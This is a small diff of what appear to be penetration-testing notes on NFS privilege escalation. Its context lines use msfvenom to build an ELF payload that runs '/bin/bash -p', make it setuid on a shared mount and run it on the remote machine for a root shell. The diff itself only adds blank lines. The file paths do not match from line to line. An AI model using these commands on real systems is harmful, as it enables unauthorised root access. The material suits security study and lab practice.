@@ -32,4 +32,9 @@
     msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/asif/shell.elf
     chmod +xs /tmp/nfs/shell.elf
   Type A Remote Machine
+  
     /tmp/shell.elf
+
+
+
+
